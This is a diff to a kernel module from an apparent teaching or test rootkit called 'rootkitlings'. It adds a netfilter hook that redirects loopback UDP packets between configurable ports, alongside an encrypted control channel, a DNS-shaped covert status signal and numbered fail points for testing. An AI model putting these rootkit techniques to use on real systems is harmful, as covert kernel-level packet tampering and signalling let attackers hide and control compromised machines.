@@ -6,12 +6,16 @@
 
 #include "agent.h"
 #include "agent_status.h"
+#include "dns_query.h"
+#include "packet_redirect.h"
 #include "platform.h"
 #include "rootkit.h"
 #include "status_signal.h"
 #include "transaction.h"
 
-#if ROOTKITLINGS_FAIL_POINT < 0 || ROOTKITLINGS_FAIL_POINT > 14
+#define RK_FAIL_PACKET_REDIRECT 15
+
+#if ROOTKITLINGS_FAIL_POINT < 0 || ROOTKITLINGS_FAIL_POINT > 15
 #error "unknown ROOTKITLINGS_FAIL_POINT"
 #endif
 
@@ -35,6 +39,14 @@ static unsigned short signal_id = 0x1234;
 module_param(signal_id, ushort, 0400);
 MODULE_PARM_DESC(signal_id, "DNS-shaped signal transaction identifier");
 
+static unsigned short redirect_from_port = 5400;
+module_param(redirect_from_port, ushort, 0400);
+MODULE_PARM_DESC(redirect_from_port, "loopback UDP port to redirect");
+
+static unsigned short redirect_to_port = 5401;
+module_param(redirect_to_port, ushort, 0400);
+MODULE_PARM_DESC(redirect_to_port, "replacement loopback UDP port");
+
 static const u8 control_key[RK_AEAD_KEY_LENGTH] = {
 	0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
 	0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f,
@@ -51,15 +63,31 @@ static const u8 signal_key[RK_AUTH_KEY_LENGTH] = {
 
 static struct rk_state *state;
 static struct rk_agent agent;
+static struct rk_netfilter_mutator packet_redirect;
 static struct rk_transaction transaction;
+
+static bool rk_packet_actions_enabled(void *context)
+{
+	return rk_state_actions_enabled(context);
+}
 
 static int __init rk_init(void)
 {
+	struct rk_netfilter_config redirect_config = {
+		.match_port = redirect_from_port,
+		.replacement_port = redirect_to_port,
+		.enabled = rk_packet_actions_enabled,
+		.registration_error =
+			ROOTKITLINGS_FAIL_POINT == RK_FAIL_PACKET_REDIRECT ?
+			-EINTR : 0,
+	};
 	int error;
 
 	if (!peer_port || !session_id || !retry_base_ms ||
 	    retry_base_ms > retry_max_ms ||
-	    retry_max_ms > 5000)
+	    retry_max_ms > 5000 || !redirect_from_port || !redirect_to_port ||
+	    redirect_from_port == redirect_to_port ||
+	    redirect_from_port == RK_DNS_SIGNAL_PORT)
 		return -EINVAL;
 	if (ROOTKITLINGS_FAIL_POINT == RK_FAIL_PREFLIGHT)
 		return -ECANCELED;
@@ -70,6 +98,7 @@ static int __init rk_init(void)
 		state = NULL;
 		return error;
 	}
+	redirect_config.enabled_context = state;
 
 	rk_events_reset();
 	error = rk_worker_start(state);
@@ -110,9 +139,12 @@ static int __init rk_init(void)
 	error = rk_proc_publish(state);
 	if (error)
 		goto unpublish_agent_status;
+	error = rk_netfilter_start(&packet_redirect, &redirect_config);
+	if (error)
+		goto stop_packet_redirect;
 
 	rk_scheduler_start(state);
-	if (ROOTKITLINGS_FAIL_POINT == 14)
+	if (ROOTKITLINGS_FAIL_POINT == RK_FAIL_STATUS_SIGNAL)
 		error = -EIO;
 	else
 		error = rk_status_signal_send(signal_key, sizeof(signal_key),
@@ -125,6 +157,8 @@ static int __init rk_init(void)
 
 stop_scheduler:
 	rk_scheduler_stop();
+stop_packet_redirect:
+	rk_netfilter_stop(&packet_redirect);
 	rk_proc_unpublish();
 unpublish_agent_status:
 	rk_agent_status_unpublish();
@@ -155,8 +189,9 @@ destroy_state:
 
 static void __exit rk_exit(void)
 {
-	rk_scheduler_stop();
 	rk_agent_stop(&agent);
+	rk_scheduler_stop();
+	rk_netfilter_stop(&packet_redirect);
 	rk_proc_unpublish();
 	rk_agent_status_unpublish();
 	rk_evidence_unpublish();
